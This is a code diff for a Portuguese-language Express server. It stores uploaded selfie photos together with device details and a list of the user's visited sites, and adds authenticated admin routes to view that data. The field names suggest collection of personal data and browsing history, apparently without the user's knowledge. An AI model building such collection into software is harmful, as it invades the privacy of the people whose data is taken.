@@ -46,7 +46,7 @@ if (!fs.existsSync(photosDir)) {
 // Rota para salvar foto
 app.post('/salvar-foto', (req, res) => {
     try {
-        const { foto } = req.body;
+        const { foto, dispositivo, sitesVisitados, timestamp } = req.body;
 
         if (!foto) {
             return res.status(400).json({ sucesso: false, mensagem: 'Foto não recebida' });
@@ -58,9 +58,20 @@ app.post('/salvar-foto', (req, res) => {
         // Gerar nome do arquivo com timestamp
         const nomeArquivo = `salfie_${Date.now()}.jpg`;
         const caminhoArquivo = path.join(photosDir, nomeArquivo);
+        const nomeMetadados = `salfie_${Date.now()}.json`;
+        const caminhoMetadados = path.join(photosDir, nomeMetadados);
 
-        // Salvar arquivo
+        // Salvar arquivo de imagem
         fs.writeFileSync(caminhoArquivo, base64Data, 'base64');
+
+        // Salvar metadados em JSON
+        const metadados = {
+            arquivo: nomeArquivo,
+            timestamp: timestamp || new Date().toISOString(),
+            dispositivo: dispositivo || {},
+            sitesVisitados: sitesVisitados || []
+        };
+        fs.writeFileSync(caminhoMetadados, JSON.stringify(metadados, null, 2));
 
         res.json({ 
             sucesso: true, 
@@ -80,7 +91,9 @@ app.post('/salvar-foto', (req, res) => {
 app.get('/fotos', autenticar, (req, res) => {
     try {
         const fotos = fs.readdirSync(photosDir);
-        res.json({ sucesso: true, fotos });
+        // Filtrar apenas arquivos JPG (não JSON)
+        const fotosJpg = fotos.filter(f => f.endsWith('.jpg'));
+        res.json({ sucesso: true, fotos: fotosJpg });
     } catch (erro) {
         res.status(500).json({ sucesso: false, mensagem: 'Erro ao listar fotos' });
     }
@@ -95,6 +108,23 @@ app.get('/fotos/:nome', autenticar, (req, res) => {
         res.sendFile(caminhoArquivo);
     } else {
         res.status(404).json({ sucesso: false, mensagem: 'Foto não encontrada' });
+    }
+});
+
+// Rota para obter metadados de uma foto
+app.get('/fotos/:nome/metadata', autenticar, (req, res) => {
+    try {
+        const nomeJpg = req.params.nome.replace(/\.jpg$/, '');
+        const caminhoMetadados = path.join(photosDir, nomeJpg + '.json');
+        
+        if (fs.existsSync(caminhoMetadados)) {
+            const metadados = fs.readFileSync(caminhoMetadados, 'utf8');
+            res.json(JSON.parse(metadados));
+        } else {
+            res.status(404).json({ sucesso: false, mensagem: 'Metadados não encontrados' });
+        }
+    } catch (erro) {
+        res.status(500).json({ sucesso: false, mensagem: 'Erro ao carregar metadados' });
     }
 });
 
